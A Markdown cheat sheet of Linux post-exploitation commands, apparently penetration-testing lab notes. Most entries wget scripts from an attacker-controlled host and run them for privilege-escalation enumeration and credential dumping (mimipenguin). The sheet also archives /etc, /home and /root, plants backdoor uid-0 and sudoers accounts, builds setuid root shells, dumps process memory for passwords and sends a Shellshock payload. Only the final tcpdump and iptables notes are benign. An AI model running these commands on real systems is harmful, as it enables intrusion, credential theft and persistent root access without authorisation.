
# Linux

## Enumeration Scripts
Determine if kernel exploit is intended:
```
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```
```
ps -ef | grep -E "tmux|knock|vnc|tty"
```
```
wget http://$source_ip/tools_linux/lse.sh; bash lse.sh -l 2 | tee lse.sh.out
```
```
wget http://$source_ip/tools_linux/LinEnum.sh; bash LinEnum.sh -t | tee LinEnum.sh.out
```
```
wget http://$source_ip/tools_linux/linpeas.sh; bash linpeas.sh -s | tee linpeas.sh.out
```
```
wget http://$source_ip/tools_linux/linuxprivchecker.py; python linuxprivchecker.py | tee linuxprivchecker.py.out
```
```
wget http://$source_ip/tools_linux/linux-local-enum.sh; bash linux-local-enum.sh standard | tee linux-local-enum.sh.out
```
```
wget http://$source_ip/tools_linux/unix-privesc-check.sh; bash unix-privesc-check.sh | tee unix-privesc-check.sh.out
```
```
wget http://$source_ip/tools_linux/linux_security_test.sh; bash linux_security_test.sh | tee linux_security_test.sh.out
```
```
wget http://$source_ip/tools_linux/checksec; bash checksec --kernel | tee checksec.kernel.out
```
```
wget http://$source_ip/tools_linux/checksec; bash checksec --fortify-proc=1 | tee checksec.proc.out
```

### General Enumeration 

Writable files:
```
find / -writable -type d 2>/dev/null
```

SUID:
```
find / -perm -u=s -type f 2>/dev/null
```

SGID:
```
find / -perm -g=s -type f 2>/dev/null
```

Mounted and unmounted volumes:
```
cat /etc/fstab
mount
lsblk
```

Device drivers and kernel modules:
```
lsmod
```
```
/sbin/modinfo <module_name>
```

## Process monitoring
```
wget http://$source_ip/tools_linux/pspy32; chmod +x pspy32; ./pspy32
```
```
wget http://$source_ip/tools_linux/pspy64; chmod +x pspy64; ./pspy64
```

## Exploit Suggesters
```
wget http://$source_ip/tools_linux/linux-exploit-suggester-2.pl; perl linux-exploit-suggester-2.pl | tee linux-exploit-suggester-2.pl.out
```
```
wget http://$source_ip/tools_linux/linux-exploit-suggester.sh; bash linux-exploit-suggester.sh | tee linux-exploit-suggester.sh.out
```
```
wget http://$source_ip/tools_linux/linuxprivchecker.py; python linuxprivchecker.py | tee linuxprivchecker.py.out
```
```
wget http://$source_ip/tools_linux/linux_kernel_exploiter.pl; perl linux_kernel_exploiter.pl | tee linux_kernel_exploiter.pl.out
```
```
wget http://$source_ip/tools_linux/Linux_Exploit_Suggester.pl; perl Linux_Exploit_Suggester.pl | tee Linux_Exploit_Suggester.pl.out
```


## Data Extraction
```
ifconfig -a; netstat -antp; arp -e; route -v; route -vn
```
```
tar -zcf linux_files.tar.gz /etc/* /home/* /root/* /var/www/* /var/log/*
```
Recursive search:
```
grep -rnwl '/path/to/somewhere/' -e "pattern"
```

## Password Dumping
```
wget http://$source_ip/tools_linux/mimipenguin_2.0/mimipenguin.py; python mimipenguin.py | tee mimipenguin.py.out
```
```
wget http://$source_ip/tools_linux/mimipenguin_2.0/mimipenguin.sh; bash mimipenguin.sh | tee mimipenguin.sh.out
```
```
wget http://$source_ip/tools_linux/memory-dump.sh
```

## Persistance
```
sudo echo "amxuser ALL=(ALL) ALL" >> /etc/sudoers
```
```
/usr/sbin/useradd -p 'openssl passwd -1 amxpass' amxuser 
```
```
/usr/sbin/useradd -p 'openssl passwd -1 -salt AbCD4536 amxpass' amxuser 
```
```
echo amxpass | passwd amxuser --stdin
```
```
echo 'amxuser::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
```
echo 'amxuser:x:0:0:root:/root:/bin/bash' >>/etc/passwd
echo 'amxuser:$1$ozUCi1Me$rBG3vK5.jZUScy39PSVtM1:14798:0:99999:7:::' >>/etc/shadow
```

## Exploit 

If SUID binary execute another command, replace it with a function:
```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Dump memory:
```
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

```
echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c; gcc privsc.c -o privsc
```

```
echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c
sudo chown root:root /tmp/setuid
sudo chmod 4755 /tmp/setuid
```

Shellshock
```
curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://$target/cgi-bin/admin.cgi
```
## Network

Grep IPs
```
grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
```

Using -X to output raw traffic
```
tcpdump -nX -r password_cracking_filtered.pcap | grep -A10 GET
```

Extract IP addresses from pcap
```
tcpdump -n -r dump.pcap | awk -F" " '{print $3}' | sort -u | head`
```

Filter for http requests
```
tcpdump -A -s 0 'tcp port 10443 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf>>2)) != 0)' -i eth0
```

Filter destination host
```
tcpdump -n dst host $target -r password_cracking_filtered.pcap
```

Filter for source host
```
tcpdump -n src host $target -r password_cracking_filter
```

Filter port
```
tcpdump -n port 81 -r password_cracking_filtered.pcap
```

Extract only ACK and PUSH packets
```
tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```

Create traffic counter for specific net
```
iptables -Z
iptables -N subnet_scan
iptables -A INPUT -d 10.11.1.0/24 -j subnet_scan
iptables -vL INPUT
```

```
iptables -Z
iptables -vn -L
```

Packet and byte counter using iptables
```
#!/bin/bash

# Reset counters and iptables rules
iptables -Z && iptables -F

# Measure incoming traffic from lab machine
iptables -I INPUT 1 -s 192.168.1.23 -j ACCEPT

# Measure outgoing traffic to lab machine
iptables -I OUTPUT 1 -d 192.168.1.23 -j ACCEPT
```
```
watch -n 1 iptables -nvL
```
